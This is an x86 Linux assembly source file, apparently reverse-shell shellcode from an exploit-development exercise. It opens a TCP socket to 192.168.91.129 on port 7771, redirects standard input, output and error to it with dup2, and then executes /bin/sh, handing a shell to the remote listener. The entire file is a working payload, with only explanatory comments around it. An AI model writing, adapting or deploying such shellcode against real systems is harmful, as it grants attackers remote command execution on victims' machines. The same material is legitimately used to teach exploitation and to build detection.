global _start
section .text

_start:

	;create sockfd/man socket: int socket(int domain, int type, int protocol)
	xor eax, eax	;clean and zero
	xor ebx, ebx
	push eax	;protocol default is zero
	push 1		;SOCK_STREAM
	push 2		;AF_INET
	mov ecx, esp	;create argv ptr

	mov al, 102     ;socketcall
        mov bl, 1       ;SYS_SOCKET
	int 0x80
	mov edx, eax	;save socketfd
	
	;connect/man connect: int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
	mov al, 102
	mov bl, 3	;SYS_CONNECT
	
	;const struct sockaddr *addr/man 2 ip: address family, port, internet address
	push DWORD 0x815ba8c0	;192.168.91.129 reversed and hexed

	push WORD 0x5b1e	;port 7771
	push WORD 2		;AF_INET
	mov ecx, esp		;create ptr to struct sockaddr
	
	push 16			;addrlen 16	
	push ecx		;struct sockaddr		
	push edx		;sockfd
	mov ecx, esp		;create ptr to connect args
	int 0x80
	
	
	;dup2/man dup2: int dup2(int oldfd, int newfd);
	mov ebx, edx            ;save old fd
	xor eax, eax		;zero eax
	mov al, 63		;dup2 code
	xor ecx, ecx		;zero ecx, STDIN is now set to zero
	int 0x80		
	
	mov al, 63              ;dup2 code	
	mov cl, 1		;STDOUT
	int 0x80
	
	mov al, 63              ;dup2 code
        mov cl, 2               ;STDOUT
        int 0x80

	;spawn a shell
	xor eax, eax
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	push eax
	push ebx
	mov ecx, esp
	xor edx, edx
	mov al, 11
	int 0x80

